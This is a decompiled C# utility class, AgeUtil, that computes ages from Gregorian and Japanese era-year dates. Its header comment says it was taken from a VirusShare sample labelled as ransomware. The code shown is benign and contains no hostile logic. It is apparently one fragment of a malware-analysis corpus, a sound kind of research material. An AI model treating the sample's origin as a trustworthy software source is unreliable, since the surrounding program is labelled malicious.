// Decompiled with JetBrains decompiler
// Type: setup.AgeUtil
// Assembly: setup, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6FA179CD-C6DD-49E1-8167-579BB94FEB58
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Agent.le-c87aca3d3f3f7d91c25f958bdf91631280e8c43d.exe

using System;

namespace setup
{
  internal class AgeUtil
  {
    public static int GetAge(string birthDate) => AgeUtil.GetAge(birthDate, DateTime.Now.ToString("yyyyMMdd"));

    public static int GetAge(string birthDate, string date)
    {
      string s1 = birthDate.Substring(0, 4);
      string s2 = birthDate.Substring(4, 4);
      string s3 = date.Substring(0, 4);
      string s4 = date.Substring(4, 4);
      int age = int.Parse(s3) - int.Parse(s1);
      if (int.Parse(s2) > int.Parse(s4))
        --age;
      return age;
    }

    public static int GetAgeWareki(string birthDate) => AgeUtil.GetAge(AgeUtil.GetADDate(birthDate), DateTime.Now.ToString("yyyyMMdd"));

    public static int GetAgeWareki(string birthDate, string date) => AgeUtil.GetAge(AgeUtil.GetADDate(birthDate), AgeUtil.GetADDate(date));

    private static string GetADDate(string s)
    {
      int num1 = int.Parse(s.Substring(1, 2));
      int num2 = 0;
      switch (s[0])
      {
        case '1':
        case 'M':
        case 'm':
          num2 = 1867 + num1;
          break;
        case '2':
        case 'T':
        case 't':
          num2 = 1911 + num1;
          break;
        case '3':
        case 'S':
        case 's':
          num2 = 1925 + num1;
          break;
        case '4':
        case 'H':
        case 'h':
          num2 = 1988 + num1;
          break;
      }
      return num2.ToString() + s.Substring(3, 4);
    }
  }
}
